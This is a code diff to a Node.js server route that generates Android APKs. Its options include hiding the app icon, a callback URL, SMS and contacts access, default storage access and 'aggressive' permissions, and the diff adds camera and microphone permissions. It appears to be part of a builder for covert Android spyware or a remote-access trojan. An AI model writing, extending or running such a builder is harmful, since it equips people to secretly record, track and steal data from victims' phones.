@@ -68,7 +68,7 @@ initBaseApk().catch(e => console.error("Init failed fatally:", e));
 
 // Generate Route
 app.post('/generate', upload.single('icon'), async (req, res) => {
-    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, aggressivePermissions } = req.body;
+    const { uuid, appName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, aggressivePermissions } = req.body;
     const customIcon = req.file;
 
     console.log(`[APK] Request for UUID: ${uuid}`);
@@ -195,6 +195,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 enableSmsPermission: enableSmsPermission === 'true',
                 enableContactsPermission: enableContactsPermission === 'true',
                 enableStoragePermission: enableStoragePermission !== 'false', // Default to true
+                enableCameraPermission: enableCameraPermission === 'true',
                 aggressivePermissions: aggressivePermissions === 'true'
             };
             fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));
@@ -218,6 +219,12 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     if (enableContactsPermission === 'true') {
                         permissionsToAdd += '    <uses-permission android:name="android.permission.READ_CONTACTS" />\n';
                         console.log('[APK] Adding READ_CONTACTS permission');
+                    }
+
+                    if (enableCameraPermission === 'true') {
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.CAMERA" />\n';
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.RECORD_AUDIO" />\n';
+                        console.log('[APK] Adding CAMERA and RECORD_AUDIO permissions');
                     }
 
                     if (permissionsToAdd) {
